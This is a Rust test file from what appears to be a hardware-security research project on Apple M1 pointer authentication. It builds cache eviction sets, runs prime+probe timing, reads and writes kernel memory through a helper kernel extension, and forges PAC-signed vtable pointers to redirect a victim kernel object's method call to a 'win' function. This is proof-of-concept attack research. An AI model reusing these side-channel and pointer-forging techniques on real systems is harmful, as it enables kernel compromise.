/*!
 * Test code to manually create eviction sets and confirm data/ instruction contention is visible.
 */

use crate::*;

/**
 * Compare the different timers.
 */
pub unsafe fn test_timers(shared_mem: &mut [u8]) {
    let mut x = 0;
    let t1_mach = gettime();
    let t1 = read_volatile(&CTR);
    for i in 0..1000 {
        x = i / 2 + x;
    }
    let t2 = read_volatile(&CTR);
    let t2_mach = gettime();
    println!("Time difference (thread): {}", t2 - t1);
    println!("Time difference (mach): {}", t2_mach - t1_mach);
    println!("{}", x);
}

/**
 * Demonstrate a data eviction set.
 */
pub unsafe fn data_ev_set_test(shared_mem: &mut [u8]) {
    if !set_core(CoreKind::PCORE) {
        println!("Error setting CPU affinity!");
        return;
    }

    let evset = data_evset(&shared_mem[0], shared_mem);

    // Demonstrate eviction of shared_mem[0]
    println!("reading 0x{:X} twice", &shared_mem[0] as *const u8 as u64);
    let t0 = read_counter();
    read_volatile(&shared_mem[0]);
    let t1 = read_counter();
    read_volatile(&shared_mem[0]);
    let t2 = read_counter();

    for evaddr in &evset {
        read_volatile(*evaddr);
        // println!("evicting 0x{:X}", *evaddr as *const u8 as u64);
    }

    println!("reading 0x{:X}", &shared_mem[0] as *const u8 as u64);
    let t1_2 = read_counter();
    read_volatile(&shared_mem[0]);
    let t2_2 = read_counter();

    println!("Time difference (uncached): {}", t1 - t0);
    println!("Time difference (cached): {}", t2 - t1);
    println!("Time difference (post-eviction): {}", t2_2 - t1_2);

    println!("=========================");
    // Now we show prime probe
    // prime
    for evaddr in &evset {
        read_volatile(*evaddr);
    }

    // evict(?)
    // for _ in 0..1000{
    // 	read_volatile(&shared_mem[0]);
    // }

    let mut results = [0u64; 0x10000];
    let mut cur_idx : usize = 0;

    // probe
    for evaddr in &evset {
        asm!{"isb"}
        let t1_3 = read_counter();
        read_volatile(*evaddr);
        let t2_3 = read_counter();
        results[cur_idx] = t2_3 - t1_3;
        cur_idx+=1;
    }

    println!("prime+probe Results");
    println!("[ ] == Empty, [X] == Cached");
    let mut num_miss = 0;
    for idx in 0..evset.len() {
        if results[idx] >= 50 {
            println!("[ ] {}", results[idx]);
            num_miss+=1;
        }
        else {
            println!("[X] {}", results[idx]);
        }
    }
    println!("{} / {}", num_miss, evset.len());
}

/**
 * Demonstrate an instruction eviction set.
 * DEPRECATED- mk_retpoline method has been removed for performance reasons.
 * (physical eviction sets explore far too many addresses to fill a retpoline region before choosing candidates).
 */
// pub unsafe fn inst_ev_set_test(shared_mem: &mut [u8]) {
//     let retpoline = match mk_retpoline(shared_mem) {
//         None => {
//             println!("Couldn't make a retpoline region!");
//             return;
//         }

//         Some(x) => x
//     };

//     println!("Retpoline is at 0x{:X}", &retpoline[0] as *const u32 as u64);
//     println!("Shared memory is at 0x{:X}", &shared_mem[0] as *const u8 as u64);
//     assert_eq!(&retpoline[0] as *const u32 as u64, &shared_mem[0] as *const u8 as u64);

//     let evset = inst_evset(&retpoline[0], retpoline);

//     let retpoline_fn : extern "C" fn() = core::mem::transmute(&retpoline[0]);

//     let t1 = read_counter();
//     asm!{"isb"};
//     retpoline_fn();
//     asm!{"isb"};
//     let t2 = read_counter();
//     asm!{"isb"};
//     retpoline_fn();
//     asm!{"isb"};
//     let t3 = read_counter();

//     // for i in 1..=6 {
//     // 	let idx = ((19 - i) * 32768) / core::mem::size_of::<u32>();
//     // 	let retpoline_entry : extern "C" fn() = core::mem::transmute(&retpoline[idx]);
//     // 	retpoline_entry();
//     // }

//     for evaddr in evset {
//         let retpoline_entry : extern "C" fn() = core::mem::transmute(evaddr);
//         asm!{"isb"};
//         retpoline_entry();
//         asm!{"isb"};
//     }

//     let t1_2 = read_counter();
//     asm!{"isb"};
//     retpoline_fn();
//     asm!{"isb"};
//     let t2_2 = read_counter();

//     println!("Uncached execution time: {}", t2 - t1);
//     println!("Cached execution time: {}", t3 - t2);
//     println!("Post eviction execution time: {}", t2_2 - t1_2);
// }

pub unsafe fn inst_pev_set_test(shared_mem: &mut [u8]) {
    let handle = match PacmanKitConnection::init() {
        Some(v) => v,
        None => panic!("Couldn't connect to PacmanKit"),
    };

    let mut kernel_mmap_va = match handle.kernel_mmap() {
        Ok(v) => v,
        Err(err) => panic!("Couldn't call IOMalloc in the kernel!"),
    };

    let kernel_mmap_pa = handle.kernel_virt_to_phys(kernel_mmap_va).unwrap();
    let target_set = cache::get_cache_set_m1(kernel_mmap_pa);
    println!("Kernel mmap VA: 0x{:X}\n            PA: 0x{:X}\n", kernel_mmap_va, kernel_mmap_pa);
    println!("Generating eviction set to match address with L2 set {}...", target_set);

    let evset = inst_pevset(kernel_mmap_va, kernel_mmap_pa, shared_mem);
    println!("Found {} conflicts.", evset.len());

    println!("{:X?}", evset);

    let retpoline_fn : extern "C" fn() = core::mem::transmute(evset[0]);
    println!("Calling 0x{:X}", evset[0]);

    let t1 = read_counter();
    asm!{"isb"};
    retpoline_fn();
    asm!{"isb"};
    let t2 = read_counter();
    asm!{"isb"};
    retpoline_fn();
    asm!{"isb"};
    let t3 = read_counter();

    for evaddr in evset {
        let retpoline_entry : extern "C" fn() = core::mem::transmute(evaddr);
        println!("Calling 0x{:X}", evaddr);
        asm!{"isb"};
        retpoline_entry();
        asm!{"isb"};
    }

    let t1_2 = read_counter();
    asm!{"isb"};
    retpoline_fn();
    asm!{"isb"};
    let t2_2 = read_counter();

    println!("Uncached execution time: {}", t2 - t1);
    println!("Cached execution time: {}", t3 - t2);
    println!("Post eviction execution time: {}", t2_2 - t1_2);
}

/**
 * Test the PacmanKitConnection methods.
 */
pub unsafe fn test_pacmankit() {
    let handle = PacmanKitConnection::init().unwrap();
    let kernel_base = handle.get_kernel_base().unwrap();
    println!("Kernel base is at 0x{:X}", kernel_base);
    println!("Kernel base contains 0x{:X}", handle.kernel_read(kernel_base).unwrap());
    // handle.kernel_write(kernel_base, 0x4141414141414141).unwrap();
    handle.kernel_write(kernel_base, 0x100000CFEEDFACF).unwrap();
    println!("Kernel base contains 0x{:X}", handle.kernel_read(kernel_base).unwrap());
    println!("Kernel base is at 0x{:X}", handle.kernel_virt_to_phys(kernel_base).unwrap());
    let user_addr = (&handle as *const _) as u64;
    println!("User address 0x{:X} has physical address 0x{:X}", user_addr, handle.user_virt_to_phys(user_addr).unwrap());
    println!("Handle is at 0x{:X}", handle.get_handle_loc().unwrap());

    let cache_test_addr = 0x17F;
    println!("Offset is {}", get_cache_offset_m1(cache_test_addr));
    println!("Set is 0x{:X}", get_cache_set_m1(cache_test_addr));
    println!("Tag is 0x{:X}", get_cache_tag_m1(cache_test_addr));

    let kern_mmap_ptr = match handle.kernel_mmap() {
        Ok(mmap_ptr) => mmap_ptr,
        Err(error) => panic!("Failed to allocate kernel memory!"),
    };
    println!("Got a pointer at 0x{:X}", kern_mmap_ptr);

    handle.kernel_free().unwrap();
}

/**
 * Test our ability to forge PACs given a PAC(addr, salt) oracle.
```text
Overview of C++ vtable class signing:

Let PacmanKitService be a C++ class where the PacmanUser : IOUserClient class
has a public PacmanKitService member variable (not a pointer, just a regular member var).

PacmanUser:
+------------------+
|   IOUserClient   |
+------------------+
|       ...        |
| PacmanKitService:|
| +-------------+  |       PacmanKitService`vtable:
| | vtable_ptr  |--+-----> +--------------------+
| +-------------+  |       | externalMethod_ptr |
|       ...        |       +--------------------+
+------------------+

The PACs can be computed using:
vtable_ptr = PACDA(address = vtable, salt = object | 0xd986);
externalMethod_ptr = PACIA(address = externalMethod, salt = (&vtable | 0xa7d5))
```
 */
pub unsafe fn test_forge_pacs() {
    // Handle is used for interfacing with PacmanKit
    let handle = PacmanKitConnection::init().unwrap();

    // Victim handle gives us a victim IOUserClient to exploit
    let victim_handle = PacmanKitConnection::init().unwrap();

    let iouserclient_base = victim_handle.get_handle_loc().unwrap();
    let pacmankitservice = iouserclient_base + pacmankit::PACMANKIT_TO_HELPER;
    let pacmankitservice_vtable = handle.kernel_read(pacmankitservice).unwrap();
    let pacmankitservice_vtable_masked = pacmankitservice_vtable | PAC_BITMASK;
    let pacmankitservice_externalMethod = handle.kernel_read(pacmankitservice_vtable).unwrap();
    let pacmankitservice_externalMethod_masked = pacmankitservice_externalMethod | PAC_BITMASK;
    println!("IOService is at 0x{:X}", iouserclient_base);
    println!("PacmanKitService is at 0x{:X}", pacmankitservice);
    println!("PacmanKitService`vtable is at 0x{:X}", pacmankitservice_vtable_masked);
    println!("PacmanKitService`vtable signed is 0x{:X}", pacmankitservice_vtable);
    println!("PacmanKitService`externalMethod signed is 0x{:X}", pacmankitservice_externalMethod);

    let salt_data = get_salt(pacmankitservice | PAC_BITMASK, 0xd986);
    let salt_inst = get_salt(pacmankitservice_vtable | PAC_BITMASK, 0xa7d5);

    for _ in 0..1000 {
        let forged_vtable_ptr = handle.forge_sign_data(pacmankitservice_vtable_masked, salt_data).unwrap();
        let forged_vtable_entry = handle.forge_sign_inst(pacmankitservice_externalMethod_masked, salt_inst).unwrap();
        println!("Forge-signed vtable is 0x{:X}", forged_vtable_ptr);
        println!("Forge-signed externalMethod is 0x{:X}", forged_vtable_entry);
        assert_eq!(forged_vtable_ptr, pacmankitservice_vtable);
        assert_eq!(forged_vtable_entry, pacmankitservice_externalMethod);
    }

    let win_ptr = handle.leak_win().unwrap();

    // Manually call win:
    // handle.kernel_exec_for_timing(win_ptr, true).unwrap();

    // Forge vtable with mmap region and use that to call win:
    let kernel_mmap = handle.kernel_mmap().unwrap();
    let salt_data = get_salt(pacmankitservice | PAC_BITMASK, 0xd986);
    let salt_inst = get_salt(kernel_mmap | PAC_BITMASK, 0xa7d5);
    let new_vtable_ptr = handle.forge_sign_data(kernel_mmap, salt_data).unwrap();
    let new_vtable_entry = handle.forge_sign_inst(win_ptr, salt_inst).unwrap();

    handle.kernel_write(kernel_mmap | PAC_BITMASK, new_vtable_entry).unwrap();
    handle.kernel_write(pacmankitservice | PAC_BITMASK, new_vtable_ptr).unwrap();

    // This should not be redirected...
    handle.call_service_routine(0, 1, 2, 3, 4, 5).unwrap();

    // And this one should be redirected!
    victim_handle.call_service_routine(0, 1, 2, 3, 4, 5).unwrap();
}
